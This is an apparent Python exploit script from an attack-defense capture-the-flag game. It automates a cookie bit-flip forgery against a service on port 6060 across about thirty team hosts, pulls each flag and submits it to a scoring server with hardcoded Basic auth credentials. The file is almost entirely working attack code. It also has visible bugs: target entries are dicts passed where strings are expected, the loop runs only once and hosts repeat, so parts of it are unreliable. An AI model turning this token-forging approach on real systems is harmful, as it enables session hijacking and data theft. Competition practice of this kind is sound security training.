from pwn import *
from time import sleep
import requests
import json

def submit(flag):
	print(flag)
	url = "http://10.115.0.2:8000/flag"
	data = json.dumps({"flag": flag})
	# if the team name is bi0s and password is bi0s - you need base64 of "bi0s:bi0s"
	header = {"Authorization": "Basic YmkwczpiaTBz"}
	r = requests.post(url, data=data, headers=header)
	print r.text 
	return
def get_cookie(ip,payload):
	conn = remote(ip,6060);sleep(0.1)
	a = conn.recv()
	conn.sendline('1');sleep(0.1)
  	a = conn.recv()
	conn.sendline(payload);sleep(0.1)
	cookie = conn.recv();conn.close()
	return cookie.split(':')[1].strip(' ').strip('\n')
def Edit_cookie(cookie):
	cookie = cookie[4:].decode('hex')
	cookie = cookie[:9]+chr(ord(cookie[9] )^32)+cookie[10:]
	cookie = cookie.encode('hex')
	return cookie
def get_flag(ip,cookie):
	conn = remote(ip,6060);sleep(0.1)
	a = conn.recv()
	conn.sendline('2');sleep(0.1)
	a = conn.recv()
	conn.sendline(cookie);sleep(0.1)
	a = conn.recv();conn.close();
	out = [x.strip('\n').strip(' ') for x in a.split('\n')]
	for line in out:
		if line[:3] == 'FLG':
			return line
def Exploit(ip):
	print(ip) ; payload = '1'
	cookie = get_cookie(ip,payload)
	cookie = Edit_cookie(cookie)
	flag   = get_flag(ip,cookie)
	submit(flag)
def start():
	global IPs
	for ip in IPs:
		try:
			Exploit(ip)
		except:
			print("Error with the ip addr :: "+ip)
def main():
  	start()
  	sleep(60) # Sleep for 60 sec which means it runs 3 times for 1 tick , it's not a problem at all.

IPs = [
 {"ip": "10.115.1.2", "team_id": 1},
 {"ip": "10.115.1.18", "team_id": 2},
 {"ip": "10.115.1.34", "team_id": 3},
 {"ip": "10.115.1.50", "team_id": 4},
 {"ip": "10.115.1.66", "team_id": 5},
 {"ip": "10.115.1.82", "team_id": 6},
 {"ip": "10.115.1.98", "team_id": 7},
 {"ip": "10.115.1.114", "team_id": 8},
 {"ip": "10.115.1.130", "team_id": 9},
 {"ip": "10.115.1.146", "team_id": 10},
 {"ip": "10.115.1.162", "team_id": 11},
 {"ip": "10.115.1.178", "team_id": 12},
 {"ip": "10.115.1.194", "team_id": 13},
 {"ip": "10.115.1.210", "team_id": 14},
 {"ip": "10.115.1.226", "team_id": 15},
 {"ip": "10.115.1.242", "team_id": 16},
 {"ip": "10.115.2.2", "team_id": 17},
 {"ip": "10.115.2.18", "team_id": 18},
 {"ip": "10.115.2.34", "team_id": 19},
 {"ip": "10.115.2.50", "team_id": 20},
 {"ip": "10.115.2.66", "team_id": 21},
 {"ip": "10.115.2.82", "team_id": 22},
 {"ip": "10.115.2.98", "team_id": 23},
 {"ip": "10.115.2.114", "team_id": 24},
 {"ip": "10.115.2.130", "team_id": 25},
 {"ip": "10.115.2.146", "team_id": 26},
 {"ip": "10.115.2.162", "team_id": 27},
 {"ip": "10.115.2.178", "team_id": 28},
 {"ip": "10.115.2.226", "team_id": 29},
 {"ip": "10.115.2.194", "team_id": 30},
 {"ip": "10.115.1.2", "team_id": 1},
 {"ip": "10.115.1.18", "team_id": 2},
]
main()
